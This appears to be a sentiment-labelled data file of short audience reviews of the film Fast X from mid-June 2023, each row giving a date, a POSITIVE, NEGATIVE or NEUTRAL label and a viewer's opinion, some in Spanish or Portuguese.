"Jun 14, 2023",NEUTRAL,"fast and furious movie like we love them, not the best, not the worst. lot of action, not lot of blabla"
"Jun 14, 2023",NEGATIVE,Wasn’t like the old ones
"Jun 14, 2023",NEGATIVE,"It was like watching a Marvel movie mixed with zombies (Return on the leaving dead), The Joker and mission impossible. Why not watch all at the same time."
"Jun 14, 2023",NEUTRAL,"very little comedy, the little comedy it did have was very korny."
"Jun 14, 2023",POSITIVE,Honestly ever Fast and Furious movie has had a very positive and ending that can lead to family always coming back together. Not sure if their will be one or two more but the cliff hanger ending creates so much about what could be next. I can’t wait to see what happens next.
"Jun 14, 2023",POSITIVE,"Despite the repetitiveness of the Fast and Furious franchise, Fast X delivers something different and executes a Part 1 movie nearly perfectly. It's a simple movie about (believe it or not) family and serves some incredible action sequences and a genuinely threatening, but funny, villain in Jason Momoa which compliments the rest of the cast well. The only place the movie struggled was not knowing how to handle the amount of characters and has some pacing issues in the second act."
"Jun 14, 2023",POSITIVE,"Unnnecssary gruesome scenes with deceased guys and Jason mamoa-disliked. The rest of the movie, cast and scenes were amazing and absolutely genius."
"Jun 14, 2023",NEUTRAL,"I definitely cringed a few times, but the movie wasn’t for my enjoyment, it was for my dad. My dad loves action and even if it’s dumb he’ll enjoy it. So, personally 3, but it kept my dad happy and entertained so in that aspect 4"
"Jun 14, 2023",NEGATIVE,Did not enjoy the movie plot. Jason Mamoa has too much speaking time. He should have had less.
"Jun 14, 2023",NEUTRAL,"It's a lot of action, I just didn't like how the movie ended."
"Jun 14, 2023",POSITIVE,"Overall is good movie, surely is better than Fast Fast & Furious 9: The Fast Saga"
"Jun 14, 2023",POSITIVE,Great action and fun summer movie!!
"Jun 14, 2023",NEUTRAL,It was definitely Extreme on action. It jumped around making it a little confusing.  It had everyone in it.   It Totally left you hanging in many parts.
"Jun 14, 2023",POSITIVE,"I thought the movie was 10/10 honestly!! And i was not expecting it to be that good. But i had to see it because of Jason Mamoa and he did not disappoint. I wasnt expecting that from his character, but he was hilarious and played crazy really well. Story line and plot was similar to previous movies, but it was still good. Action scenes were great. I feel like this is one of the best Fast and Furious movies out of all of them."
"Jun 14, 2023",NEGATIVE,So bad. So far from the first 3 movies. Keeps going down hill. Idk how people keep giving these movies good ratings 
"Jun 13, 2023",POSITIVE,Awesome loved all the action
"Jun 13, 2023",NEGATIVE,"It's a complete waste of time. This franchise should have died years ago, but for some reason, I guess greed and lack of creativity, they can't stop milking the brand and even the physically dead Paul Walker. Just stop!"
"Jun 13, 2023",NEUTRAL,It’s a “Fast” movie. The entire basis is cars…explosions….guns….aircraft….A list stars…. It was ultimately entertaining for my son and I. But the sequels just keep going and going and going. Worthy of nostalgic entertainment value.
"Jun 13, 2023",NEUTRAL,Momoa is worth the price of admission. The directing is choppy. And some scenes come across as being “phoned-in”. 
"Jun 13, 2023",NEUTRAL,"As a longtime fan of the Fast and Furious franchise, I've come to expect and even enjoy its hallmark exaggerated hyped up over-the-top action and driving scenes. However in this tenth installment, while being thoroughly entertained with some of the opening action scenes (like Rome etc.), I found myself losing interest around the halfway mark with the seemingly nonstop cartoonishly CGI action, that was completely lacking any semblance of realism whatsoever. It's like they wanted to cram too much of these types of effects in, and it just comes across as goofy in my opinion. Another gripe is while I usually don't mind Jason Momoa, I really disliked his portrayal of the villain. I just found him annoying as hell, and he became even more increasingly irritating as the film unfolded. Recommend viewing for longterm fans of the series, but newcomers steer clear, because I highly doubt FF-X would get anyone hooked in to exploring the previous gems."
"Jun 13, 2023",NEUTRAL,"The theater was clean and nice the location was awesome as well. 
What I didn't like was the servers bringing food on the middle othe movie and blocking your view of the screen. I think there should be another way of doing this."
"Jun 13, 2023",NEGATIVE,It's bad and boring. I fell asleep. They target a specific audience interested by hype and low expectations.
"Jun 13, 2023",NEUTRAL,"Jason Momona's character was too dark and just sick. Most of the comic relief was too dark.   It was action packed from beginning to end.  
I do want to see what happens in the next movie."
"Jun 13, 2023",NEGATIVE,"que vilão é esse, gente? kkkkkkkkkkkk"
"Jun 13, 2023",POSITIVE,By far the best franchise ever been fan of it since day 1 I will always be a fan ride or die
"Jun 13, 2023",NEGATIVE,"Jason Momoa saves the movie, I could rate one star, a very forced action scenes... as a Fan of F&F and Paul walker Fan"
"Jun 13, 2023",NEGATIVE,"I don't know, why the quality of the F&F movies is falling so drastically. Maybe the scriptwriters strike is part of the problem (namely - the reason of those strikes, bad attitude towards scriptwriters and scripts as a whole).

The movie doesn't have a plot at all. The whole story is just awfully terrible. The main antagonist isn't explained at all, nothing for the audience to condemn or relate. He is JUST bad...same as protagonists, right? But no, if it's Dom - You cannot do anything to his family. But if Dom is doing something against someone else's family - that's ok. Murdering a whole bunch of people on the way - that's even better. Destroying the capital of Italy - nah, it's ok. The bloody enemy of the previous parts, who killed one of your family? Nah, he's now our friend.

The script. It's...it's something, that would lose even on a highschool competition level. Seriously. The behavior of the characters, the dialogues, the scenes...what the actual hell. It looks like the actors had to write their own phrases themselves. That is not a level of a multimillion film. A whole squad of armed soldiers can't catch a girl with a kid?

The end and the hint for the future story? Oh come on, what can possibly happen next...

This is just plainly terrible."
"Jun 13, 2023",NEGATIVE,Tired of these movies
"Jun 13, 2023",NEGATIVE,To many stars of course everyone needed screen time !!! This whole movie was cringe. I've officially gave up on the fast and the furious franchise !!!!!!!
"Jun 13, 2023",POSITIVE,"It's was so good the action,  effects everything so excited for fast 11. 10 really build up the excitement. Love the movie"
"Jun 13, 2023",POSITIVE,as a fast fan i truly loved this film EXCEPT for jason mamora... idk why everyone loved him but i dont think this role was for him...maybe it wouldve been better for...brad pit?
"Jun 13, 2023",NEGATIVE,"it's fine for what it is, i'm not watching it again though. Jason shines."
"Jun 13, 2023",POSITIVE,"Hicieron lo que hacen mejor, acción y más acción. No dieron vueltas con una historia inteligente, y no mostraron los motores, porque todos por dentro son el Batmobile"
"Jun 13, 2023",NEGATIVE,They could have warned that it is just Part (1/2). The movie itself is okay but a lot of really unrealistic stunts and the giga cliffhanger is almost evil and I was almost about to ask to get my money back. I am really disappointed by that movie.
"Jun 13, 2023",POSITIVE,Great action sequences! The Dante character is well played by J. Momoa.
"Jun 13, 2023",NEGATIVE,"the movie is nothig but lazy writing and excesssive use of green screen ,the movie is an insult to the intelligence of the viewer , vin diesel need to stop milking a cow who's been dead since 2015 , all those movies since the 7th one are doing is building hatred toward the franchis"
"Jun 13, 2023",POSITIVE,It's way better than I expected from this movie and it ends in good cliffhanger which makes you wanna see the second one.But Note DO NOT TAKE THIS MOVIE SERIOUSLY It literally ends the laws of physics and so unrealistic from the real world.Just sit back and enjoy the movie of what it is.
"Jun 13, 2023",NEUTRAL,It gets kinda outrageous but it's the fast and the furious.
"Jun 13, 2023",NEUTRAL,"story line and end there wasn't one
not the same caliper as previous fast movies"
"Jun 13, 2023",POSITIVE,Action movie of the month.  There is so much going on with this movie and still staying with the main focus of this thrilling movie.  I might go watch it again.
"Jun 13, 2023",POSITIVE,I was raised on these movies so out of 10 I will say 30/10. The only thing that I wish we could have seen would be mia's and Brian's child. I love how Jason Momoa brought so much to the screen with the character that he was given. But every time I see these movies I always wish I can have a family that there like that. Read to fight and protect the ones they care for no matter the cost. So it's a 💯.
"Jun 13, 2023",NEUTRAL,"No es ni de lejos la mejor película de la saga, pero un fan de la saga siempre disfruta una nueva película de Rápidos y Furiosos. La trama es simple pero cumple, y los efectos son bastante buenos."
"Jun 13, 2023",NEGATIVE,unfortunately the movie theater was extremely hot & the popcorn was stale.
"Jun 13, 2023",POSITIVE,Hated the cliffhanger ending but good action
"Jun 13, 2023",POSITIVE,"Super funny, super family orientated, overall a great movie. I could easily watch 1,2,3 and 10 and be cool lol it was that good"
"Jun 13, 2023",POSITIVE,Movie was fantastic!
"Jun 13, 2023",NEGATIVE,"This was ok to watch one time, one time only."
"Jun 13, 2023",NEGATIVE,Embarrassing.  Getting more and more ridiculous for a money grab stealing from the audience.  Time to end these...
"Jun 13, 2023",NEGATIVE,Don't waste ur time for this..
"Jun 13, 2023",NEGATIVE,Jason Momoa as a flamboyant villain was the best thing about this movie.
"Jun 12, 2023",NEGATIVE,Pointless movie. This series should have ended years ago.
"Jun 12, 2023",POSITIVE,I like how all the players were involved again.  Jason did a fantastic job!!
"Jun 12, 2023",NEUTRAL,as well as the predecessors. great movie. Action film with action and humor.
"Jun 12, 2023",NEGATIVE,"Honestly, I have always enjoyed these movies but they truly ruined them by adding Jason Momoa. Just not a good actor. He should have stayed underwater."
"Jun 12, 2023",POSITIVE,"How? How does The F&F Franchise keep putting out epic films that spawn decades? The characters, the growth, the family. Just love it!"
"Jun 12, 2023",NEGATIVE,What was worse: the writing or the acting?
"Jun 12, 2023",NEUTRAL,"It's a worthwhile sequel, except for 2-3 unrealistic action sequences, but not as usual as previous installments. Back-to-back high-speed chases and first-fight scenes don't get you bored. Jason Momoa is a surprise package as a villain, and John Cena proves that he can act as well. Charlie's Theron shines again in her villainous role. After a long time, I must say that the franchise has matured enough to make sure it continues to entertain its fan base for several years to come. Last but not least, I already know Han Gf is alive, and I can't wait to see how Han reacts. hahaha"
"Jun 12, 2023",NEGATIVE,I wish i could have given this 0 stars. Vin Diesel somehow forgot how to act. This is just an excuse to make money. Worst film ever! (maybe F9 also)
"Jun 12, 2023",POSITIVE,"As always, Vin Diesel and the other regulars made the action wonderful, there were many of the connections to the earlier movies in the series, some of which were hilarious and others thought provoking.
Can't wait to see the next one...sorry that it is to be the last one."
"Jun 12, 2023",NEUTRAL,"Igual de ilogica en su universo, despues de que en la IX se viaje al espacio en un auto, nada es demasiado y aqui vuelven a ignorar toda logica."
"Jun 12, 2023",NEGATIVE,I'm glad the theater I'm watching it in right now is completely empty so I can entertain myself on my phone. This movie is so dumb and boring. I'm also convinced it's a money laundering operation because a movie that cost $340 million dollars should not have CGI this bad.
"Jun 12, 2023",NEGATIVE,"It's pretty damn bad that's for sure. It passed the time, and that's fine but... yeah."
"Jun 12, 2023",NEGATIVE,"Hello.

It's hard to describe how bad this movie is. The acting, dialogue, plot and so on are at such a low level that this is some kind of record. This will go down in the history of the film industry as an example of the degradation of cinema.

It is better to watch at increased speed and in the background, so as not to spend a lot of time on this garbage.

It's sad that society is so willing to consume such rubbish."
"Jun 12, 2023",POSITIVE,Movie need to be 3 hours long. Loved it!
"Jun 12, 2023",NEGATIVE,To be honest it was the worst of the series of Fast and Furious.  Ir so unrealistic that it was hard to sit for the 2 1/2 hrs of the movie.  I was truly disappointed in this movie
"Jun 12, 2023",POSITIVE,Loved the movie and all the actions and the love for family.
"Jun 12, 2023",POSITIVE,"a good balance between action, comedy and cars. Jason Momoa was the perfect choice and plays the role exceptionally"
"Jun 12, 2023",POSITIVE,Good storyline and fast paced as usual.
"Jun 12, 2023",NEGATIVE,Complete mess this movie was horrible
"Jun 12, 2023",POSITIVE,"Fast and furious and exciting! Such and awesome cast, incredible stunts and Love the faith and family thread running through it. Need more movies like this!"
"Jun 12, 2023",NEGATIVE,"Fast X is another exhausting brainless blockbuster to grace your local movie theaters. It retains the same nonsensical, action and defiance of physics and the laws of gravity as fast nine. Thankfully, it isn't as laden and excruciating as the previous entry thanks largely to the histrionics and theatrics of Jason Momoa, who does play a solid, joker knock off as the villain. Vin Diesel once again, Waze, what should be a buoyant action adventure down with his depressive demeanor. There is no need for two more films. One more to close out the entire saga would suffice."
"Jun 12, 2023",POSITIVE,"I wish The Rock was in this film other than the scene after the credits. spoiler alert I would also like to know how Giselle survived. Overall this movie is in alignment with all of the others: intense action scenes of impossible acts, peppered with some comedic relief. If you dont like the F&F franchise, you wont like this one. I love all of the movies so much and this one met my expectations."
"Jun 12, 2023",NEUTRAL,"Jason Mamoa is flamboyant and as outsized in personality as these movies are in physics. It is a nice counterpoint to the weird machismo that made little sense when there weren't hot girls in tiny outfits everywhere.

But they bring back two hot girl scenes also. They clearly want to bring this full circle. Maybe in the last one they'll have to steal DVD players again."
"Jun 12, 2023",POSITIVE,Nothing love it love it! My heart was racing like I was in the movie lol intense
"Jun 12, 2023",NEUTRAL,I have seen all of the Fast & Furious movies. This one was the most unbelievable and portions of it didn't make sense to me. It looked as though they went back and pulled in all of their menesis but where was the Rock?
"Jun 12, 2023",NEUTRAL,I felt the story was ok . I enjoyed the action scenes but overall I thought Jason momoa provided a fresh spark to the series like the Rock did for the series. I felt everything eles mostly fell flat besides seeing old faces return .
"Jun 12, 2023",NEUTRAL,Better than F9. Jason Mamoa is great as Dante.
"Jun 12, 2023",NEGATIVE,Jason momoa ruined the movie. His acting was poor. He looked like a bearded lady. It was hard to enjoy this film even with all the action stars in it. Everyone apparently dies but it's hard to tell since the movie ends without explanation.
"Jun 12, 2023",POSITIVE,It was awesome like all ways ready for the next FastX great job!!!
"Jun 12, 2023",POSITIVE,Pretty good action packed.
"Jun 12, 2023",POSITIVE,Love it lots of action
"Jun 12, 2023",NEGATIVE,"First...Aquaman is NOT a convincing bad guy.  It just did not work.  Second. Where is the score?  No music that fits,  just Rap.  Third. The writing ( as in talking)  is very very weak.  Almost as if a bunch of teeny boppers wrote this garbage.  We gave it a 4 as we are nice people,,,The chase scenes are credible but Over the Top unrealistic,,"
"Jun 12, 2023",POSITIVE,Left me still wanting more… and can’t wait for the next one!
"Jun 12, 2023",POSITIVE,Very good movie!!! They always leave you ready for the next one!!!!! 🙌🏽🙌🏽🙌🏽
"Jun 12, 2023",POSITIVE,This movie was a great and fun to watch one of the best Fast and Furious movies to date
"Jun 12, 2023",NEGATIVE,"So, real question. If they already knew they were going to make ANOTHER sequel, why the actual hell would they pack eight hours worth of nothing but pure, simple exposition into a two and a half hour, self fallating, cgi disaster. #FastX2023 #beatingadeadhorse #pleasestop"
"Jun 12, 2023",NEGATIVE,"I did not how they made some scene!!
from start to finish Vin did not even get a little scratch from all that happened in the movie!!! how the hell that happened is he clark Kent?
and some scene feels like watching a mission impossible movie but more impossible than the real mission impossible movie. i did not like the scene when he saves the girl from the bomb underneath the car. how did he know that the car will flip? and how did he know that the bomb will be Thrown out of the car? can vin diesel foresaw the future? and his kid i wish they made an other way the villain to get his son it feels like it's to much coincidence!!! i wish they made something. maybe they are fighting many people and no one can protect his son. even the god's eye. it's to much coincidence 🤦 it's too easy to get when she got shot the villain just gets it to easy who would do that something very important just put it in your pocket?"
"Jun 12, 2023",NEGATIVE,"This franchise has nothing left. Nada nothing. Its all pointless and been there done that. This supposedly last film didnt need to be split in two, but I hope the next one is definitely the last one. Watching this you could tell even the characters are bored"
"Jun 12, 2023",NEGATIVE,"You can watch it just for the action and special effects. Other than that, there's nothing worthy from this movie."
"Jun 12, 2023",NEGATIVE,Honestly?  The villain was the only semi believable character.  The action was sort of fun though.  Sexism was extreme though
"Jun 12, 2023",NEGATIVE,"What a waste of time! Boy,.. Somewhere along the way they've lost all semblance of having a sense about it. Now its just shameless money-making. This whole narrative or ""family-family-BBQ-beer-family-family"" is way to rotten and empty to be put in any movie, even starring Vin D. No the movie is not ""bad-bad"" but it's like a gulp of gasoline from the tube, an unwanted minor accident. Not something worth making. A lot of noise for nothing, jeez I wish I've never download this from TPB. I feel sorry for dudes who went to watch this in cinemas, really very sorry. Be happy, be good. P.s. Bikes in this movie are still _amazing_ though.."
"Jun 12, 2023",NEGATIVE,"Its story made absolutely no sense, terrible screenplay, but good action. And that's practically all the movie is aiming for, it knows its premise is absolutely ridiculous, but it doesn't really care about its story. The fast and furious franchise is practically all style over substance, and if you're just looking for something to take your mind off things, and not waiting for an actually well written film, then this would be a good way to spend your afternoon."
"Jun 12, 2023",NEGATIVE,Too goofy and to much CGI it isn’t how they used to be anymore
"Jun 12, 2023",POSITIVE,Pretty until you see ending. 😤
"Jun 12, 2023",POSITIVE,Dante is that guy...
"Jun 12, 2023",NEGATIVE,Just no idea why they make these movies anymore. Terrible. Watched on digital and could only last 5 minutes.
"Jun 12, 2023",NEUTRAL,Awesome cars. Mindless characters and storyline. Pure entertainment.
"Jun 12, 2023",NEGATIVE,"This movie was so bad. So tired of these movies being overdone with actors.  It's like these producers are trying to incorporate Mission Impossible and Expendables in to the Fast and Furious and it's soooo lame.  There's fight scenes with music now, high tech military scenes and at one point I thought I was watching the movie Crank.  Make the movie about cars dammit.   Y'all could have incorporated a new ZR1 or the Dark Horse there are so many cars coming out.  There was literally 1 racing scene.  I'm done with these cheesy movies"
"Jun 12, 2023",POSITIVE,So much action 👍🏽👍🏽
"Jun 12, 2023",NEGATIVE,Some how this series is still going.  Like most things Universal/Comcast is choosing to run this into the dirt.  I let it go.
"Jun 12, 2023",POSITIVE,"A cliffhanger of an ending. We will have to see what will come in the future. But overall, your typical fast family doing what they do best, heists, action and family."
"Jun 12, 2023",POSITIVE,"Jason Momoa steals the show, also, end credits scene!"
"Jun 12, 2023",NEGATIVE,Did not like all the special effects & fictional action. I won’t be seeing the next one.
"Jun 12, 2023",POSITIVE,it was a great movie loss of action
"Jun 12, 2023",POSITIVE,Better than I thought it was going to be!
"Jun 12, 2023",NEGATIVE,"over done stunts to the point as being stupid.   Every actor had a bad spray on tan, bad acting..  Do NOT waste your money"
"Jun 12, 2023",POSITIVE,Didn’t like the ending
"Jun 12, 2023",POSITIVE,"What is there to say about this franchise? We all may talk about it, but we all still enjoy it every time a new one is released. Fast X hits the mark with action and charisma. The new additions to the cast are very welcome. Looking forward to see where this ""Final Ride"" will take us!"
"Jun 12, 2023",POSITIVE,I like the whole movie it was good.
"Jun 12, 2023",NEGATIVE,We left 40 min into it.  Not good at all
"Jun 12, 2023",POSITIVE,So much fun and all the great character’s appearances.
"Jun 12, 2023",NEUTRAL,Too far fetched for my taste!
"Jun 12, 2023",POSITIVE,Action-packed and there will definitely be another installment in this franchise.
"Jun 12, 2023",POSITIVE,Disappointed with the ending
"Jun 12, 2023",NEGATIVE,"This is the worst movie I have ever seen in my life!
I hate it so much I watched frozen back to back 13 times to wash off the disappointment of this new movie! I had more enjoyment watching satélites move at night then watching this fast x movie! I Can eat raw Brussels sprouts and get more enjoyment from it then re watch this depression of a ""movie"". My kids pull better stunts with real effects then any scene in this 2 hours and 21 minutes waste of time movie. After I watched this movie I had to take 4 depression pills to get back to functioning like a normal human being. 

Watch it! Then you'll have to schedule your visit to the physiatrist to get your pills too!"
"Jun 12, 2023",NEGATIVE,"This is the worst fast and the furious sequel. Very bad story, very bad acting, unrealistic effects. This saga should stop, no sense on continuing it."
"Jun 12, 2023",NEGATIVE,"Nothing new, except a terrifically funny performance from Jason Mamoa, who single-handedly saves the movie and the franchise, which had become too serious, too dull, and too much Vin."
"Jun 12, 2023",POSITIVE,Action packed from beginning to end!
"Jun 12, 2023",NEUTRAL,"Think this might be a spoiler alert..... if you haven't watched it yet, please wait to watch it before making assumptions..
you know what they say about assumption....makes an Ass out of you and Me....

Have to say it really is high octaine, going by my notes on the movie.
 so much codedt make it a good movie.
for people in the moveie that are good at computers to be hacked is a joke!!!
The bomb going through Rome, buses and other moter mobiles can't stop the bomb but one car can? dosen't make sense, mabe its not suppose to. 
Storyline doesn't add up to the rest of the moveies so thats another star gone. 
don't mind the fighting sences with the girls fighting each other because they look more (sexy) appeals to the men/women?
I have to say that that the comedy is epic in this movie that that is what we all need right now, haven't laughed so much in a long time. 
At first the ending, appears to me so messed up that its unbelieveable, but wait until the end.... its not finished ....... its not what you think.....
Worth Watching till the end and Can't Wait till the next Movie......."
"Jun 12, 2023",POSITIVE,Suspenseful and not gory.
"Jun 11, 2023",NEGATIVE,"Gave me cancer, absolutely horrendous"
"Jun 11, 2023",NEGATIVE,A waste of time! Badly written movie. It is the worst of the whole series! It is like a totally different writer and director. Need to retire the movie series!
"Jun 11, 2023",NEUTRAL,"not a bad one when compared to the 8th and 9th instalments of the franchise,"
"Jun 11, 2023",NEGATIVE,Decent fight choreography but everything else is just kinda whack.
"Jun 11, 2023",POSITIVE,Loved it. Momoa talks too much. Like in all his roles except for GOT. Loved seeing everyone again. Cannot wait for yhe next installment.
"Jun 11, 2023",NEGATIVE,Honestly don’t know where to start in terms of story telling but let’s just say it drags… for what’s to say it feels like everyone just trying to have there own saga verse what ever… there’s laughs here and there and I would say the steal of the show is Jason’s character everything else felt pushed n mixed all together to make it make sense. In my opinion 🤷🏽‍♂️
"Jun 11, 2023",NEGATIVE,How does Dominic get a son with a different skin color?
"Jun 11, 2023",NEGATIVE,The writing was sophomoric and the acting was poor. The scene where the two woman protagonists had four minutes before they are found in the prison so they fight was completely lame.
"Jun 11, 2023",POSITIVE,Great movie! Action packed
"Jun 11, 2023",POSITIVE,I can't get enough of this franchise. They have me hooked!
"Jun 11, 2023",NEUTRAL,"You seen one - you have seen them all. Nothing new here. It is all action, and fairly predictable. It passes the time, but no real meat here."
"Jun 11, 2023",NEGATIVE,This is bad. Ugly bad. Don't waste your time.
"Jun 11, 2023",NEGATIVE,"Mamoa crushed his character, was what saved the entire movie. "
"Jun 11, 2023",NEGATIVE,This one felt rushed. The ending wasn't really much of an ending. Larson is a terrible addition to the franchise. I've owned every available hard copy from this franchise over the years but this one might not make it into my collection. Stop bringing every one back to life and please race more.
"Jun 11, 2023",NEGATIVE,Really bad movie. Only Jason Mamoa was worth it.
"Jun 11, 2023",NEUTRAL,"I guess there’s gonna be another one lol, ending kinda sucked but the beginning was awesome"
"Jun 11, 2023",POSITIVE,"This movie was great , not a boring moment just pure action ⭐️⭐️⭐️⭐️⭐️"
"Jun 11, 2023",NEGATIVE,The overall movie was bland and the ending was TBD
"Jun 11, 2023",POSITIVE,In my opinion this is the most interesting movie of the fast and furious franchise. It's been 22 years since the first movie came out and the franchise had really changed for this time. Waiting for the 12th film.
"Jun 11, 2023",NEGATIVE,"Nothing we haven't seen in the past , except for Jason Momoa performance, Fast X brings nothing new to the screen and has long boring scene. Fast past action? In the form of choppy editing with some shots/ takes not following continuity from previous angle/shot. Vin Diesel is playing Dom so straight, so stoic he's the least interesting character . Charlize Theron , Brie Larson and Alan Ritchson deserved more scenes/dialogues. It's so repetitive , we know what will happen in every scene. And "" family"", Mia doesn't seem to have her place in this franchise. All is too formulaic, predictable with  corny dialogue. Action sequences aren't stimulating enough and the emotion falls flat. Stunt coordination is subpar to the likes of Mission Impossible / John Wick / Atomic Blonde / Extraction. poor CGI /green screen break the immersion. Not even good "" dumb fun""…."
"Jun 11, 2023",NEGATIVE,Using good old family theme of FF franchise with nothing new. Just enjoy the action unreasonable scenes. Not much need to watch this movie again. Have part2 not good for this franchise.
"Jun 11, 2023",POSITIVE,This was 🔥 Hubby and i really enjoyed it and I know it will be ANOTHER ONE. They can’t leave us hanging like this…
"Jun 11, 2023",NEGATIVE,"You thought 2 was bad? Wait till you see this one. This movie was so exaggerated! It was ridiculous! Super polished and photoshopped, stunts are ridiculous and don’t make sense at times, funny at times but felt like they were trying to hard. Writing made no sense. I’m disappointed in this franchise and what it has become. I WAS a fan, now…not so much."
"Jun 11, 2023",NEGATIVE,"Mais do mesmo: um filme cheio de cenas de ação clichê, efeitos especiais saturados e um final mais que decepcionante. Carros? Somente para decoração (ou para serem espetacularmente destruídos). Foi os bons tempos em que corridas eram o ""carro forte"" da franquia."
"Jun 11, 2023",NEGATIVE,This was so bad that I had to turn it off one half of the way through
"Jun 11, 2023",NEUTRAL,"Too much unrealistic, fantasy type action. The first 4 were the best, now it’s all stupid, unrealistic scenes. I do love the cast and the mix of action and  comedy which is why I watch them all."
"Jun 11, 2023",NEGATIVE,"The Fast movies have been steadily going downhill with each new itteration, but this one manages to be a little bit better then it's predecessor. 

Everyone loves an over the top action movie, but Fast 9 and Fast X just get a rocket and go far over the top. Seeing them launch a rocket into space was just straight up ridiculous. 

This movie doesn't do anything as ridiculous as that, but still does too much ridiculous stuff to be taken seriously. Seeing Vin Diesel's character lift a dodge charger with just one hand, or racing of the side of a dam is just idiotic.

The only really good thing about this movie is the villain. Jason Momoa shines in his role and gives of Joker-like vibes, which i really love. 

This is one of those watch at home movies when you're bored, but definitely don't go to the theaters to watch this."
"Jun 11, 2023",POSITIVE,The stunts were amazing and all the characters who reappeared from previous seasons were phenomenal.The ending was unexpected but I am all for it.Love the suspense anticipating the next season.
"Jun 11, 2023",NEUTRAL,Decent but it was better than the prev one
"Jun 11, 2023",POSITIVE,We got what we paid for!
"Jun 11, 2023",NEUTRAL,"More of the same, but slight better. Fast X is a slight improvement upon its predecessor, F9, injecting some energy that was sorely lacking in the last movie. It comes with all the tropes you expect from this franchise. The contrived villain, the implausible action sequences, the death defying stunts, the bloated cast of characters, the nonsensical plot conveniences. It's all here.

This film feels a little more grounded than its predecessor, with one scene in particular feeling like a nice little callback to the original 2001 film.
The cast all deliver performances expected of them. They know what exactly what to do after all these years, except for Sung Kang as Han, who looks bored and disinterested throughout the movie. Jason Momoa is unhinged as the new baddie Dante Reyes, clearly having the time of his life in the role. Daniela Melchior is a welcome addition as steer racer Isabel Neves, the sister of little Brian's late mother, Elena. Even Brie Larson delivers a decent performance in her role.

These movies aren't the type that warrant a detailed nitpicking or plot analysis, but If I had to level two major criticisms against the film, it would be the CGI. It's very noticeable. For a film that coast over $300 MILLION to make, I'd expect the effects to appear more seamless. Another would be the fact that It's very noticeably a set-up for another movie. While there's nothing wrong with setting up events for future pay-offs, it fails to stand on its own and feels as if too many things are happening at once.

I don't consider myself to be a diehard fan of the ""Fast Saga"", but if I'm being honest, I've come to appreciate them not only for what they are, but what they stand for. That is, a bygone era. The action, the macho men, the exotic locations, the attractive women, the camaraderie. They represent a bygone era in Hollywood. A time when movies just focused on entertaining their audience, as opposed to lecturing on modern society's evils. This one's certainly not going going to win over any new fans, but if you're already a fan, you'll get a kick out of Fast X."
"Jun 11, 2023",POSITIVE,"Super me diverti! Jason Momoa entregou tudo! E com um final digno de continuação! Isso é tiro, porrada, bomba e velocidade!"
"Jun 11, 2023",POSITIVE,Omg so great and intense movie.... the effects are amazing... I recommend a 200%
"Jun 11, 2023",NEGATIVE,"so bad, so bad its just pure hot garbage, how has this such a high rating gives me no faith in humanity"
"Jun 11, 2023",NEGATIVE,The worst episode of the franchise !!!
"Jun 11, 2023",NEGATIVE,Supposed to Netflix and chill with my girl but ended getting nun because of how shit this movie was
"Jun 11, 2023",NEGATIVE,"I am a big fan of the FnF franchise, but this one sucked! Why do we love FnF - ridiculous car chases, explosions, bikinis, big name actors, action, occasional laugh, bad catch phrases… this movie however has too much story line which is doesn't conclude, brings more people back from the dead, and just leaves you saying ""huh is that it"" at the end. I want my money and time back."
"Jun 11, 2023",NEGATIVE,I'm still convinced John Cena is not dead.
"Jun 11, 2023",NEUTRAL,just so dumb but fun. jason mamoa rules
"Jun 11, 2023",NEGATIVE,honestamente no crei que hubiera otra pelicula de la saga que superara a la 7 en fantacia. pero lo mas gracioso es que hasta logro con creces. siendo a mi parecer la peor de la saga hasta ahora. una pelicula llena de escenas absudas. minomo deberian tener un rasguño. digo para hacerla un poco mas creible si es que eso es posible.
"Jun 11, 2023",POSITIVE,It was fast-paced fun with a lot of the characters from the franchise.  Loved the action!!
"Jun 11, 2023",POSITIVE,Ridiculous at times but enjoyable throughout.  Jason Momoa made the movie what it was.  An excellent ansemble of actors.
"Jun 11, 2023",POSITIVE,"Enjoyed it! If your going into any of the F&F movies expecting real-life driving scenarios grounded in reality, them your an idiot! If you watch it for what it is, summer movie that's FX heavy mindless fun. If u are in that mindset then the movie is entertaining fun!"
"Jun 11, 2023",NEGATIVE,It was horrible dont watch it
"Jun 11, 2023",NEGATIVE,"Way too many actors, no storyline, too many 6 vs 1 fights, special effects are simply not believable.  They need to cut the number of actors, make it more believable and actual write a story that gets you attached to the actors. They would be more successful with 1/2 the budget…

The only good part was the yellow Z."
"Jun 11, 2023",POSITIVE,"if u have been following since the beginning, u must go see this one!"
"Jun 11, 2023",POSITIVE,"Even after 9 movies, they keep bringing it. Now on to 11!"
"Jun 11, 2023",NEGATIVE,"Miss the old movies where the racing and action was real… all the new movies are becoming extremely fake, unrealistic scenes, horrible acting and same plot as all the previous movies… it's safe to say they need to stop making more movies."
"Jun 11, 2023",NEGATIVE,This movie needed to die a long time ago. Honestly after Paul Walker died so did this movie. It was literally from about F7 on that it just went off the rails dumb. FX was not as bad as 9 but pretty bad nonetheless. F11? Nope I’ll pass.
"Jun 11, 2023",POSITIVE,"Always a great watch, entertaining and fast paced."
"Jun 11, 2023",POSITIVE,Awesome action sequences!
"Jun 11, 2023",POSITIVE,love it I would watch again
"Jun 11, 2023",NEGATIVE,They should’ve stopped after 10!
"Jun 11, 2023",POSITIVE,"FastX lines us up for something very spectacular. With part 2 already having a release date, we could potentially get a third and final part in the next two years after part 2. This movie is amazing, I recommend it to anyone who enjoys a lot of action. This movie is not a filler movie like everyone seems to think it is. It just helps paint the picture between FastFive and FastX(i.e. 10 years)."
"Jun 11, 2023",NEGATIVE,Daunte/Jason Momoa? Big mistake. Completely doesn't fit in the overall feel of F&F movies. I ended up just forwarding through the stupid lines and always having his arms outstretched (weird). That character pretty much ruined the movie for me. His lines were horribly written and didn't fit in anywhere.  The action and driving scenes were great of course. Hated the ending too. Worst F&F of all.
"Jun 11, 2023",POSITIVE,It was ok but the movie have very much things yo explain AND dont like the final but the rest Is ok
"Jun 11, 2023",POSITIVE,"A Lot of Action,Well Planned out Story Line. Some of the Action Scenes  are a Little over the Top. Reccomend Watching this Movie!!"
"Jun 11, 2023",POSITIVE,Jason Momoa was perfecr for the role of Daunte! He brought new energy to the Fast saga!!  Can't wait to see more!!
"Jun 11, 2023",POSITIVE,Predictably preposterous.  Fun!
"Jun 11, 2023",NEGATIVE,"Awful, Awful, Awful. The same tired premise, based not at all in reality, and was painful to watch most of the time. The storyline was a copy of so many past FF movies. Save your money and avoid it."
